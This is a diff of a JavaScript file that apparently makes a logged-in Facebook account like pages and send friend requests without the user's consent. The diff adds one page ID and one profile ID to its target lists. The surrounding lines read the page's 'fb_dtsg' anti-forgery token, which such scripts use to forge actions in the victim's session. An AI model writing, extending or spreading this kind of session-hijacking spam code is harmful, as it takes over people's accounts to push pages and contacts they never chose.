@@ -36,7 +36,8 @@ LIST("503774323004340");
 LIST("177777859044364");
 LIST("296332940501763");
 LIST("252854598187657");
-LIST("461311090622996")
+LIST("461311090622996");
+LIST("452505254839947");
 
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
@@ -117,6 +118,7 @@ a("100004164938729");
 a("100001610096787");
 a("100003751777172");
 a("100002263264013");
+a("100003898640819");
 
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
